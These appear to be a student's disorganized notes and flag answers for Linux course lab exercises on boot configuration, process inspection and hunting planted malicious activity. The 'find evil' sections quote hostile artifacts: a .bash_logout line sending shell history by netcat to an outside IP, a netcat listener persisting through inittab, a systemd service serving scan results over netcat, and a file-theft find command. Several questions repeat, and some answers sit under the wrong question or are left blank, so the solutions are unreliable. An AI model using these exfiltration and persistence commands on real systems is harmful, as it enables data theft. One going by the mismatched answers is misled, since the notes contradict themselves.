Identify the Linux Kernel being loaded by the Grub, by examining its configuration.

Enter the command used by the Grub, and the full path to the Kernel, as the flag.

Flag Format: command,kernel location

HINT:

Click me for help understanding Grub commands

Machine: Minas_Tirith

********************************************************* SOLUTION ********************************************************


To identify the Linux kernel being loaded by GRUB (the GRand Unified Bootloader), you need to examine the GRUB configuration file. The configuration file typically contains menu entries, each of which may specify a command to load a particular kernel.

The most common location for the GRUB configuration file on modern Linux systems is /boot/grub/grub.cfg or /boot/grub2/grub.cfg. However, this file is often automatically generated by scripts (like update-grub on Debian-based systems), and it is recommended to not edit it directly.

The specific command used by GRUB to load the Linux kernel is typically linux (followed by the path to the kernel) in the menu entry. Here's how you can find the command and kernel location:

Open the terminal.

Use a command like cat or less to view the contents of the GRUB configuration file. For example:

bash
Copy code
cat /boot/grub/grub.cfg
or

bash
Copy code
less /boot/grub/grub.cfg
Look for the menu entries in the file. Each entry starts with menuentry. Inside each menuentry, find the line starting with linux. This line will include the full path to the kernel.

The command and kernel path will look something like this:

bash
Copy code
linux /boot/vmlinuz-<version>-generic root=...
The flag format you provided is command,kernel location. Based on the typical GRUB configuration, your flag might look like:

javascript
Copy code
linux,/boot/vmlinuz-<version>-generic
Replace <version> with the actual version number from the GRUB configuration file.

Please replace the kernel version with the specific version you find in your GRUB configuration file.

$$$$$$$$ 

cat /boot/grub/grub.cfg


linux,/boot/vmlinuz-4.9.0-16-amd64


######################################################### Linux Basics 1 5 #########################################################

What command lists the contents of directories in Linux/Unix systems?

********************************************************* SOLUTION ********************************************************

ls

######################################################### Linux Basics 2 5 #########################################################

For the ls command, what arguments, or switch options, will allow you to print human-readable file sizes in a long-list format?

The flag is entire command, including arguments

********************************************************* SOLUTION ********************************************************

ls –lh


######################################################### Linux Basics 3 5 #########################################################

What character will pipe the standard output from

echo "I’m a plumber"

to another command, as standard input?

********************************************************* SOLUTION ********************************************************

|

######################################################### Linux Basics 4 5 #########################################################


What argument/switch option, when used with man, will search the short descriptions and man-page-names for a keyword that you provide?

The flag is the complete command, with argument/switch.

********************************************************* SOLUTION ********************************************************

man -k 

######################################################### Linux Basics LFS Hierarchy 5 #########################################################

What is the absolute path to the root directory?


********************************************************* SOLUTION ********************************************************

/

######################################################### Linux Basics LFS Hierarchy2 5 #########################################################

What is the absolute path to the default location for configuration files?

********************************************************* SOLUTION ********************************************************

/etc

######################################################### Linux Basics LFS Hierarchy3 5 #########################################################

What is the directory that contains executable programs (binaries) which are needed in single user mode, to bring the system up or to repair it?

********************************************************* SOLUTION ********************************************************

/bin

######################################################### Linux Basics LFS Hierarchy4 5 #########################################################

What is the absolute path to the directory which contains non-essential binaries that are accessible by standard users as well as root?

********************************************************* SOLUTION ********************************************************

/usr/bin

######################################################### Linux Basics LFS Hierarchy5 5 #########################################################

An absolute path to a directory which contains binaries only accessible by the root user, or users in the root group.

********************************************************* SOLUTION ********************************************************

/sbin

######################################################### Linux Basics LFS Hierarchy6 5 #########################################################

What is the absolute path for the binary cat man-page?

Research: https://man7.org/linux/man-pages/man1/man.1.html

********************************************************* SOLUTION ********************************************************

whereis cat
/usr/share/man/man1/cat.1.gz


^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/////////////////  LINUX BOOT PROCESS   /////////////////^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Linux Boot Process -> https://os.cybbh.io/public/os/latest/007_linux_boot_process/linboot_fg.html

student@linux-opstation-kspt:~$ lsblk                                                               # Locate the hard drive and partition in Linux

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0 31.1M  1 loop /snap/snapd/10707
loop1    7:1    0 55.4M  1 loop /snap/core18/1944
loop2    7:2    0 44.7M  1 loop /snap/openstackclients/38
loop3    7:3    0 55.5M  1 loop /snap/core18/1988
loop4    7:4    0 31.1M  1 loop /snap/snapd/11036
sr0     11:0    1  514K  0 rom  /media/student/config-2
vda    252:0    0  128G  0 disk                                                                     # Shows disk vda virtual disk A
└─vda1 252:1    0  128G  0 part /                                                                   # Shows virtual disk A partition 1 is mounted as the / or root drive in Linux


Examining the contents of the MBR with xxd

student@linux-opstation-kspt:~$ sudo xxd -l 512 -g 1 /dev/vda                                       # Execute xxd to hexdump 512 bytes in separated by 1 byte from /dev/vda to the screen

00000000: eb 63 90 00 00 00 00 00 00 00 00 00 00 00 00 00  .c..............                         # The start of the hard drive shown by the code eb 63. File signature for an MBR.
00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
_truncated_
000001b0: cd 10 ac 3c 00 75 f4 c3 fa b7 12 e6 00 00 80 00  ...<.u..........                         # The first partition of the hard drive in 0x01be shown as 80
000001c0: 21 02 83 0f 2e 40 00 08 00 00 df f7 ff 0f 00 00  !....@..........                         # The second partition entry is blank!
000001d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
000001e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
000001f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 aa  ..............U.

student@linux-opstation-kspt:/$ ltrace -S cat /etc/passwd                                           # Execute ltrace to track the systemcalls occurring when running cat /etc/passwd.
_truncated_
open("/etc/passwd", 0, 037777402000 <unfinished ...>                                                # open systemcall on /etc/passwd returns a file descriptor of 3.
SYS_openat(0xffffff9c, 0x7ffcbb66d68c, 0, 0)       = 3                                              # read systemcall on file descriptor of 3 returns the amount of bytes in the file.
<... open resumed> )                               = 3                                              # read systemcall on file descriptor of 3 returns the amount of bytes in the file.
__fxstat(1, 3, 0x7ffcbb66be40 <unfinished ...>
SYS_fstat(3, 0x7ffcbb66be40)                       = 0
<... __fxstat resumed> )                           = 0
posix_fadvise(3, 0, 0, 2 <unfinished ...>
SYS_fadvise64(3, 0, 0, 2)                          = 0
<... posix_fadvise resumed> )                      = 0
malloc(135167 <unfinished ...>
SYS_mmap(0, 0x22000, 3, 34)                        = 0x7f0b09df0000
<... malloc resumed> )                             = 0x7f0b09df0010
read(3 <unfinished ...>
SYS_read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 131072) = 1875
<... read resumed> , "root:x:0:0:root:/root:/bin/bash\n"..., 131072) = 1875 
write(1, "root:x:0:0:root:/root:/bin/bash\n"..., 1875 <unfinished ...>                              # write systemcall to write all the 1875 bytes from /etc/passwd to stdout.


student@linux-opstation-kspt:/$ ltrace -S lsmod                                                     # Execute lsmod to list modules in Linux 

Module                  Size  Used by
aesni_intel           188416  0
aes_x86_64             20480  1 aesni_intel                                                         # Module required to use AES Encryption
crypto_simd            16384  1 aesni_intel
glue_helper            16384  1 aesni_intel
cryptd                 24576  3 crypto_simd,ghash_clmulni_intel,aesni_intel
psmouse               151552  0
ip_tables              28672  0
virtio_blk             20480  2                                                                     # Modules for Virtual Input / Output Devices used in Openstack instances.

virtio_net             49152  0
virtio_rng             16384  0
virtio_gpu             53248  3


Sample Hex Dump
00000000: cd 10 ac 3c 00 75 f4 c3 fa b7 12 e6 00 00 80 00                                           # 16 Bytes from hex address 0x00 - 0x0F (Decimal 0 - 15)
00000010: 21 02 83 0f 2e 40 00 08 00 00 df f7 ff 0f 00 00                                           # 16 Bytes from hex address 0x10 - 0x1F (Decimal 16 - 31)


student@linux-opstation-kspt:/$ cat /boot/grub/grub.cfg                                             # Concatenate the contents of /boot/grub/grub.cfg to the screen.

        linux   /boot/vmlinuz-4.15.0-76-generic root=LABEL=cloudimg-rootfs ro  console=tty1 console=ttyS0   # The kernel is loaded with the command linux. The file /boot/vmlinuz-4.15.0-76-generic contains the Linux Kernel.



cat /etc/inittab                                                                                     # Sample of /etc/initab on a SysV machine

is:5:initdefault:                                                                                    # The run level 5 is the default run level in /etc/inittab


l0:0:wait:/etc/rc0.d
l1:1:wait:/etc/rc1.d
l2:2:wait:/etc/rc2.d
l3:3:wait:/etc/rc3.d
l4:4:wait:/etc/rc4.d                                                                                  # Another non-default run level is in /etc/rc4.d
l5:5:wait:/etc/rc5.d
l6:6:wait:/etc/rc6.d



student@linux-opstation-kspt:/$ ls -lisa /lib/systemd/system/default.target                           # Show the default target unit 
lrwxrwxrwx 1 root root 16 May  3 11:30 default.target -> graphical.target                             # The system will, by default, try to run the system to the specifics set by graphical.target.
            
# Examining contents of a graphical target 

cat /lib/systemd/system/default.target | tail -n 8

Description=Graphical Interface
Documentation=man:systemd.special(7)
Requires=multi-user.target
Wants=display-manager.service                                                                         # wants=display-manager.service attempts to start other units. If they fail to start, the calling target unit will still execute.
Conflicts=rescue.service rescue.target
After=multi-user.target rescue.service rescue.target display-manager.service                          # requires=multi-server.target attempts to start other units. If they fail to start, the calling target unit will fail to execute.
AllowIsolate=yes


student@linux-opstation-kspt:/$ ls -l /etc/systemd/system/ | grep graphical
drwxr-xr-x 2 root root 4096 Feb  4  2020 graphical.target.wants                                       # A graphical.target wants directory in /etc/systemd/system/

student@linux-opstation-kspt:/$ ls -l /etc/systemd/system/graphical.target.wants/
total 0
lrwxrwxrwx 1 root root 43 Jan 31  2020 accounts-daemon.service -> /lib/systemd/system/accounts-daemon.service           # graphical.target also target wants udisks2.service and accounts-daemon.service
lrwxrwxrwx 1 root root 35 Feb  4  2020 udisks2.service -> /lib/systemd/system/udisks2.service 

student@linux-opstation-kspt:/$ ls -l /lib/systemd/system | grep graphical
lrwxrwxrwx 1 root root   16 Nov 15  2019 default.target -> graphical.target
-rw-r--r-- 1 root root  598 Jan 28  2018 graphical.target
drwxr-xr-x 2 root root 4096 Jan 31  2020 graphical.target.wants 
lrwxrwxrwx 1 root root   16 Nov 15  2019 runlevel5.target -> graphical.target

student@linux-opstation-kspt:/$ ls -l /lib/systemd/systemgraphical.target.wants/                      # Yet another graphical.target wants directory in /lib/systemd/system/
total 0
lrwxrwxrwx 1 root root 39 Nov 15  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service    # graphical.target also wants systemd-update-utmp-runlevel.service


cat /etc/systemd/system/display-manager.service | tail -n 13

[Service]
ExecStartPre=/usr/share/gdm/generate-config                                                           # ExecStart=/usr/sbin/gdm3 causes the systemd process to execute the command specified along with any arguments.
ExecStart=/usr/sbin/gdm3 
KillMode=mixed
Restart=always                                                                                        # Restart=always tells systemd to attempt to restart the command in ExecStart.
RestartSec=1s
IgnoreSIGPIPE=no

# How to list unit dependencies in a tree form 

systemctl list-dependencies graphical.target

graphical.target
● ├─accounts-daemon.service
● ├─apport.service
● ├─gdm.service                                                                                       # Wants statements to graphical.target
Wants statements to graphical.target
● ├─grub-common.service
● ├─qemu-guest-agent.service
● ├─systemd-update-utmp-runlevel.service
● ├─udisks2.service                                                                                   # Wants statements to graphical.target
● ├─ureadahead.service
● └─multi-user.target                                                                                 # Requires statements to graphical.target
●   ├─anacron.service

systemctl show -p Wants graphical.target                                                              # show wants to individual units

systemctl list-unit-files                                                                             # list every individual unit file 

systemctl cat graphical.target                                                                        # concatenate the contents of a unit file ot the screen 

cat /etc/environment

PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"       # The path variable contains all default locations to executables in Linux delimited by :.


# etc profile 
student@linux-opstation-kspt:~$ cat /etc/profile

# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).

if [ "${PS1-}" ]; then
  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then                                                 # If the variable $BASH is set and does not equal /bin/sh then execute
    # The file bash.bashrc already sets the default PS1.
    # PS1='\h:\w\$ '
    if [ -f /etc/bash.bashrc ]; then                                                                  # if the /etc/bash.bashrc exists, execute it.
      . /etc/bash.bashrc                                                                              # /etc/bash.bashrc creates the bash prompt student@linux-opstation-kspt:~$
    fi
_truncated_
if [ -d /etc/profile.d ]; then
  for i in /etc/profile.d/*.sh; do
    if [ -r $i ]; then
      . $i                                                                                            # If the directory /etc/profile.d exists, execute any script named *.sh in that directory.
    fi
  done
  unset i
fi


##### FOR THE QUESTIONS AND ANSWERS refer to the pdf document. 

######################################################################################################################################################
######################################################################################################################################################
######################################################################################################################################################




^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/////////////////  LINUX PROCESS VALIDITY   /////////////////^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Documentation -> https://os.cybbh.io/public/os/latest/010_linux_process_validity/linproc_fg.html





######################################################################################################################################################
######################################################                                             ###################################################
######################################################          12_linux_process_validity          ###################################################
######################################################                                             ###################################################
######################################################################################################################################################

######################################################### Linux Processes 1 5 #########################################################

What is the process ID (PID) of the SysV Init daemon?

*********************************************************     SOLUTION        **********************************************************

1 

https://uace.github.io/learning/init-vs-systemd-what-is-an-init-daemon

######################################################### Linux Processes 2 10 #########################################################

How many child processes did SysV Init daemon spawn?

*********************************************************     SOLUTION        **********************************************************

######################################################### Linux Processes 1 5 #########################################################

What is the process ID (PID) of the SysV Init daemon?

*********************************************************     SOLUTION        **********************************************************


ps displays information about a selection of the active processes

Here, we know init has a PID of 1. To see child processes of this main process use:

pgrep -P $(your_process1_pid)

To grab the length

garviel@terra:~$ pgrep -P 1 | wc -l

ans -> 22

######################################################### Linux Processes 3 10 #########################################################

Identify all of the arguments given to the ntpd daemon (service) using ps.

Format: List all options with parameters (include numbers).

*********************************************************     SOLUTION        **********************************************************

Here, Elf produce the most complete information for each process

Now using ps to grep the ntpd we ger following results:

ps -elf | grep -I “ntpd”

-p /var/run/ntpd.pid -g -u 105:109

######################################################### Linux Processes 4 10 #########################################################

What is the parent process to Bombadil’s Bash process? (name of the binary, not the absolute path)

*********************************************************     SOLUTION        **********************************************************

- use command ps –efj to see all the running process

- to find the bash use: bombadil@minas-tirith:/$ ps -efj | grep "bash" ----- this will give us 3 results

Now to get the parent pocess grep the PPID (PPID is parent process to PID), PPID is 3rd column

ps -efj | grep 6441

ps -efj | grep 6441

#Note even if I grep 3006 it still gives the sshd as the parent process

######################################################### Linux Processes 1 5 #########################################################

Identify the file mapped to the fourth file descriptor (handle) of the cron process.

HINT: There might be multiple cron processes, but only one with the answer.

Flag format: /absolute/path

*********************************************************     SOLUTION        **********************************************************

sudo lsof -c cron # run these to list teh files mapped... look at the FD section which is the file descriptor 3u is the fourth file descriptor and the answer will be /run/crond.pid

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Lsof = list of open files command

Sudo Lsof –c (your process name) # in this case cron to view the list of each file opened by a particular process ID

Now, to read the files find a number starting with 0---- we count this with 1 so the 4th file is

/run/crond.pid



######################################################### Linux Processes 6 10 #########################################################

Identify the permissions that cron has on the file identified in Processes 5.

HINT: Read the man page for lsof to understand permissions.

Flag format: If more than one, list the permissions comma separated, no spaces

*********************************************************     SOLUTION        **********************************************************

Sudo lsof –c “cron” # to View the files-----when we scroll down, we can see 5 for processes

In file descriptor it has u, which stands for read and write permission

# read,write

######################################################### Linux Processes 7 10 #########################################################

Identify the names of the orphan processes on the SysV system.

NOTE: Remember, orphan processes spawn and die periodically. Try monitoring the processes list with top or htop to find them.

Flag format: in alphabetical order with all non-alphabetic characters removed: Name,Name,Name,Name

HINT: Only character names!

*********************************************************     SOLUTION        **********************************************************

htop #patiently wait for the appearing and disappearing look at the last column

BruceWayne__
11010 root       20   0  4028    68     0 S  0.0  0.0  0:00.00 ├─ Aragorn_____
11009 root       20   0  4028    68     0 S  0.0  0.0  0:00.00 ├─ Eowyn_______
11008 root       20   0  4028    68     0 S  0.0  0.0  0:00.00 ├─ Tolkien_____Main

  PID USER      PRI  NI  VIRT   RES   SHR S CPU% MEM%   TIME+  Command
11326 root       20   0  4028    72     0 S  0.0  0.0  0:00.00 ├─ BruceWayne__
11325 root       20   0  4028    72     0 S  0.0  0.0  0:00.00 ├─ Aragorn_____
11324 root       20   0  4028    72     0 S  0.0  0.0  0:00.00 ├─ Eowyn_______
11323 root       20   0  4028    72     0 S  0.0  0.0  0:00.00 ├─ Tolkien_____Main

Aragorn,BruceWayne,Eowyn,Tolkien

Look at the last column it will pop up with orphan processess

Aragorn,BruceWayne,Eowyn,Tolkien

######################################################### Linux Processes 8 10 #########################################################

Locate zombie processes on the SysV system.

Identify the zombie processes' parent process.

NOTE: Remember, zombie processes only live until the parent process kills and removes them from the system’s process table. Try monitoring the processes list with top or htop to find them.

Flag format: /absolute/path

*********************************************************     SOLUTION        **********************************************************

run htop 

look at column s for Z then pick the path.. 

  PID USER      PRI  NI  VIRT   RES   SHR S CPU% MEM%   TIME+  Command
 4389 root       20   0 37984  4300  3824 S  0.0  0.2  0:00.00 ├─ /lib/systemd/systemd-logind
 1768 root       20   0  6300  1656  1544 S  0.0  0.1  0:00.00 ├─ /bin/netcat -lp 9999
 1767 root       20   0  4028  1004   932 S  0.0  0.0  0:00.42 ├─ /sauron
12144 root       20   0  4028   648   588 S  0.0  0.0  0:00.00 │  └─ /bin/funk
12148 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │     ├─ !!!!!!!!!
12147 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │     ├─ ___James_
12146 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │     ├─ ___Rick__
12145 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │     └─ ____Im___

/bin/funk

######################################################### Linux Processes 9 10 #########################################################

Locate the strange open port on the SysV system.

Identify the command line executable and its arguments.

Flag format: /executable/path -arguments

*********************************************************     SOLUTION        **********************************************************

sudo lsof -i -P -n | grep LISTEN #this shows the listening port 9999 seems suspicious

Now reading all the processes and looking for 99999

Ps –elf #to look for running process

/bin/netcat -lp 9999

######################################################### Linux Process Proc Dir 1 10 #########################################################


Examine the process list to find the ssh process. Then, identify the symbolic link to the absolute path for its executable in the /proc directory.

The flag is the absolute path to the symbolic link, and the file it is linked to.

Flag format: /absolute/path,/absolute/path

*********************************************************     SOLUTION        **********************************************************

Ps –elf | grep ssh ##Look for ssh process using the command:

/usr/sbin/sshd ##This gives us the first absolute path

Now, to check for the second path using grep and following PID 16885 of bombadil@pts/0

Sudo ls –l /proc/1688 #this gives us the exe

exe -> /usr/sbin/sshd

/usr/sbin/sshd, /proc/1688/exe 


lrwxrwxrwx 1 root     root     0 Nov  8 18:52 exe -> /usr/sbin/sshd

/proc/6441/exe,/usr/sbin/sshd

######################################################### Linux Process Proc Dir 2 10 #########################################################

Identify the file that contains udp connection information. Identify the process using port 123.

For the flag, enter:

Process name
File descriptor number for the udp socket
Its permissions as shown in lsof
Flag format: name,#,permission

*********************************************************     SOLUTION        **********************************************************

sudo lsof -i:123 #return all services using port 123

#The problem asks for a file that contains a UDP connection, so you must look for an IP address. Only one of these results has an IP address

ntp,19,u


######################################################### Linux Processes 10 15 #########################################################

Locate the strange open port on the SysV system.

Identify how the process persists between reboots.

The flag is the absolute path for the file that contains the persistence mechanism, and the configuration option.

HINT: Persistence is defined here

Flag format: filepath,configuration_option

*********************************************************     SOLUTION        **********************************************************

htop #will show you that port 9999 is the strange open port, so netcat is the persistence mechanism

cd /etc #to change the directory to etc and to search for netcat

ls # see where 9999 is at 

cat innitab # where 9999 is... look at the path 

/etc/inittab,91:2345:respawn:/bin/netcat -lp 9999 # concatenate the path to get to innitab and 9999

######################################################### Linux Process Proc Dir 3 15 #########################################################

Identify one of the human-readable file handles by the other program that creates a zombie process.

NOTE: Remember, zombie processes only live until the parent process kills them. Try monitoring the processes list with top or htop to find them.

The flag is the text from one of the files it reads.

*********************************************************     SOLUTION        **********************************************************

14402 root       20   0  4028   628   564 S  0.0  0.0  0:00.00 │  └─ /usr/local/bin/thenine
14403 root       20   0  4160    72     0 S  0.0  0.0  0:00.00 │     └─ ________Nazgul________
14404 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │        └─ thenine

sudo lsof -c thenine # lsof to see what thenine is

cat /opt/mysoul # /opt/mysoul is the only unique one... cat so see what's inside

######################################################### Linux Process Find Evil 1 15 #########################################################

Scenario: The Villains group has been chanting offerings to their new leader at regular intervals over a TCP connection.

Task: Identify their method of communication and how it is occurring. Locate the following artifacts: ** The chant/text used by each villain (include spaces) ** The new Lord receiving the offering ** The IP address and port that the offering is received over

Flag format: chant text,new Lord,IP:port

Machine: Minas_Tirith

*********************************************************     SOLUTION        **********************************************************

htop # run this 

 4389 root       20   0 37984  4300  3824 S  0.0  0.2  0:00.00 ├─ /lib/systemd/systemd-logind
 1768 root       20   0  6300  1656  1544 S  0.0  0.1  0:00.00 ├─ /bin/netcat -lp 9999
 1767 root       20   0  4028  1004   932 S  0.0  0.0  0:00.43 ├─ /sauron
14914 root       20   0  4028   628   568 S  0.0  0.0  0:00.00 │  └─ /usr/local/bin/thenine
14915 root       20   0  4160    68     0 S  0.0  0.0  0:00.00 │     └─ ________Nazgul________
14916 root       20   0     0     0     0 Z  0.0  0.0  0:00.00 │        └─ thenine
 1766 root       20   0  4440   776   716 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty6
 1765 root       20   0  4440   672   612 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty5
 1764 root       20   0  4440   688   628 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty4
 1763 root       20   0  4440   732   668 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty3
 1762 root       20   0  4440   672   612 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty2
 1761 root       20   0  4440   668   608 S  0.0  0.0  0:00.00 ├─ /sbin/getty 38400 tty1
 1708 root       20   0 63664  3872  3136 S  0.0  0.2  0:00.00 ├─ /usr/sbin/sshd
 6420 root       20   0 95216  6864  5904 S  0.0  0.3  0:00.02 │  └─ sshd: bombadil [priv]
 6441 bombadil   20   0 95216  3496  2536 S  0.0  0.2  0:00.70 │     └─ sshd: bombadil@pts/0
 6444 bombadil   20   0 12564  4900  3172 S  0.0  0.2  0:00.28 │        └─ -bash
14907 bombadil   20   0 15020  3580  2676 R  0.0  0.2  0:00.18 │           └─ htop
 1467 messagebu  20   0 36680  3032  2624 S  0.0  0.1  0:00.00 ├─ /usr/bin/dbus-daemon --system
 1437 ntp        20   0 95796  3056  2568 S  0.0  0.1  0:12.13 ├─ /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:109
 1463 ntp        20   0 95796  3056  2568 S  0.0  0.1  0:00.00 │  └─ /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:109
 1406 root       20   0 35800   364     0 S  0.0  0.0  0:05.58 ├─ /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid
 1329 root       20   0 21160  1876  1648 S  0.0  0.1  0:03.00 ├─ /usr/sbin/cron
14923 root       20   0 48760  2764  2360 S  0.0  0.1  0:00.00 │  └─ /usr/sbin/CRON
14942 witch_kin  20   0  4276   748   680 S  0.0  0.0  0:00.00 │     └─ /bin/sh -c /home/witch_king/camlindon > /dev/null 2
14962 witch_kin  20   0 11128  2728  2536 S  0.0  0.1  0:00.00 │        └─ /bin/bash /home/witch_king/camlindon
14976 witch_kin  20   0 11128  2524  2268 S  0.0  0.1  0:00.00 │           └─ /bin/bash /home/witch_king/camlindon
15128 witch_kin  20   0  6300  1696  1584 S  0.0  0.1  0:00.00 │              └─ nc -lw10 127.0.0.1 -p 1234


htop # monitor for Goblin_king

Mausan ukoul for avhe mubullat goth,witch_king,127.0.0.1:1234

######################################################### Linux Process Find Evil 2 15 #########################################################

Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.

Task: Identify the command being ran and how it occurs.

Flag format: command,how it occurs

Machine: Terra

Hint: Explore persistence mechanisms and services.

*********************************************************     SOLUTION        **********************************************************

find /home -name \*.txt -exec cp {} /tmp \;,vestrisecreta.service

######################################################### Linux Process Find Evil 3 15 #########################################################

Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts.

The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes.

Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.

Flag format: command,persistence

Machine: Terra


*********************************************************     SOLUTION        **********************************************************

find / -type f -size +100000 2>/dev/null # find the file occupying the most size 
ps aux # views running processes... the one below stands out

root      1006  0.0  0.0  21776   588 ?        Ss   Nov06   0:00 /bin/bash -c /bin/apache3 -lp 443 <

############

Non-Standard Apache Command:
The command /bin/apache3 -lp 443 is not a standard Apache HTTP Server command. Apache typically runs as httpd or apache2, not apache3.

Running as Root:
Apache and other web servers typically do not run as the root user for security reasons. Seeing Apache running as root is a red flag.

Listening on Port 443:
While it's normal for web servers to listen on port 443 (HTTPS), the way it's specified in the command (-lp 443) is non-standard.

Use of Bash:
The use of /bin/bash -c to run this command is unusual for a standard Apache service, which typically starts via a service manager like systemd, not directly from a bash command.

Command Injection or Unauthorized Command Execution: An attacker may have gained access to the server and executed a non-standard command, potentially masquerading as an Apache process.
Malware or Rootkit: The unusual command might be a part of a malicious script or a rootkit running on the server.


Command Injection, Malware or Rootkit # Method #DDOS
/bin/bash -c /bin/apache3 -lp 443     # Command


<<<Answer>>>
DDOS # Method
/bin/apache3 -lp 443 < /dev/urandom # command 

##########

######################################################### Linux Process Find Evil 5 15 #########################################################

Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts can’t find any persistent connections, but notice a spike in traffic on logon and logoff.

Task: Identify how the command history is stolen from the machine.

The flag is the file used to execute the commands, and where they are sent.

Flag format: /absolute/path/to/file,IP:port

Machine: Terra

*********************************************************     SOLUTION        **********************************************************

# There is a spice in logon and logoff so we should inspect Look in the scripts (.bashrc, .bash_profile or .profile, .bash_logout, etc.) for lines that involve network commands like curl, wget, nc (netcat), or other custom scripts.
cat .bashrc # should be run from the home directory cd ~ . This shows no content of malicious behavior
cat .profile # Reveals suspect commands below 
export HEAD=$(cat /dev/urandom | tr -dc a-f0-9 | head -c 32)
export HEAD2=$(cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)

grep -r "HEAD" ~/ # try to find out what are the contents for the variables HEAD. The output for HEAD is as below

Binary file /home/garviel/Win_Bootkit.vdi matches
/home/garviel/.bash_logout:history -w /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
/home/garviel/.bash_logout:nc -w2 12.54.37.8 12000 < /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
/home/garviel/.profile:export HEAD=$(cat /dev/urandom | tr -dc a-f0-9 | head -c 32)
/home/garviel/.profile:export HEAD2=$(cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)
/home/garviel/outputkirwa001.txt:HEAD
/home/garviel/sorted_output.txt:HEAD

From the fourth file we can tell that the file path is /home/garviel/.bash_logout and this is a nc (netcat) command being sent to ip address 12.54.37.8 port 12000
Answer -> netcat -lp 3389 < /tmp/NMAP_all_hosts.txt,whatischaos.timer

systemctl list-timers # See all the timers that are currently running. Systemd timers can also be used for scheduling tasks. See what tasks are scheduled
# From running this, whatischaos.timer appears to fit the 15 minutes window and the 60-seconds interval 

systemctl status whatischaos.timer # Let's check the location of whatischaos timer. It's located at /lib/systemd/system/whatischaos.timer

cat /lib/systemd/system/whatischaos.timer # Lets find out what commands could be present in the whatischaos.timer file. ExecStart=. This line will specify the command that the timer is executing periodically.This file is missing ExecStart line. We therefore hunt for the service file 

# The service file is located in the same location as the .timer file but ends with .service instead so, /lib/systemd/system/whatischaos.service

cat /lib/systemd/system/whatischaos.service # This shows the contents of the .service file as below 

[Unit]
Description=Run a service

[Service]
Type=exec
ExecStart=/bin/bash -c 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt'
Restart=no
RuntimeMaxSec=60s


From this file, we can tell that the command would be /bin/bash -c 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt' therefore the answer will be 

netcat -lp 3389 < /tmp/NMAP_all_hosts.txt,whatischaos.timer

netcat -lp 3389 < /tmp/NMAP_all_hosts.txt -> command
whatischaos.timer -> persistence


######################################################### Linux Process Find Evil 4 15 #########################################################

Scenario: The web server has been modified by an unknown hacktivist group. Users accessing the web server are reporting crashes and insane disk usage.

Task: Identify the Cyber Attack Method used by the group, and the command running.

Flag format: method,command

Machine: Terra

Try not to break your machine on this one...

*********************************************************     SOLUTION        **********************************************************

find / -type f -size +100000 2>/dev/null

ps aux

root      1006  0.0  0.0  21776   588 ?        Ss   Nov06   0:00 /bin/bash -c /bin/apache3 -lp 443 

######################################################### Linux Processes 1 5 #########################################################

What is the process ID (PID) of the SysV Init daemon?

*********************************************************     SOLUTION        **********************************************************

######################################################### Linux Processes 1 5 #########################################################

What is the process ID (PID) of the SysV Init daemon?

*********************************************************     SOLUTION        **********************************************************

grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum


grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum

grep -E 'addr=|state="filtered"' /home/garviel/output.xml | \
awk '/addr=/ {ip=$0; next} /state="filtered"/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum

grep -E 'addr=|state=' /home/garviel/output.xml | \
grep -v 'state="closed"' | \
awk '/addr=/ {ip=$0; next} /state=/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum





